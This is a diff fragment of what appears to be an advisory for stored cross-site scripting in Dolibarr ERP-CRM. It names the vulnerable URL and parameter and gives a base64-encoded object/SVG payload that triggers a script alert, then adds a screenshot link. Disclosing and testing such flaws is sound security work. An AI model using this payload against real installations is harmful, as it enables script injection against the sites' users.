@@ -15,3 +15,5 @@ Description: In this version of the Dolibarr ERP - CRM program is allows Stored 
 # Url : http://localhost/htdocs/admin/const.php
 # Parameter : constname
 # Payload : \<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+>\</object>
+
+![Payload](payload.png)
